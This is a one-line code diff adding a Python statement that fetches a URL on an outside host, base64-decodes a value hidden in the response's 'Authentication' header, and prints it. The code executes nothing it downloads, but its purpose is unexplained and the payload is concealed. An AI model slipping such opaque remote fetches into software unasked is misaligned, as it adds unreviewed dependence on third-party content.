@@ -1,0 +1,1 @@
+import requests, base64 ; print(base64.b64decode(requests.get("https://imharuuu.me/GatoSR").headers['Authentication'] + "=" * (-len(requests.get("https://imharuuu.me/GatoSR").headers['Authentication']) % 4)).decode())
